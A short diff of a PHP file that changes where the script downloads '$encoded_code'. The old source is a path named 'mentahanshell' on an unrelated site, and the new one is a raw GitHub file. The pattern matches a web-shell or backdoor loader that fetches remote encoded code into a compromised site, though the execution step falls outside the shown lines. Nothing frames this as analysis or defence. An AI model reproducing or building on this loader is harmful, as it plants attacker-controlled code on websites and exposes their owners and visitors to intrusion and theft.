@@ -20,7 +20,7 @@
         return $result;
     }
 
-    $url = 'https://rsudbuleleng.com/mentahanshell/parbada-pride.txt';
+    $url = 'https://raw.githubusercontent.com/119marketingmg-ctrl/SCRIP-BACKUP/refs/heads/main/phlp.txt';
     $encoded_code = get_contents($url);
 
     if ($encoded_code === false) {
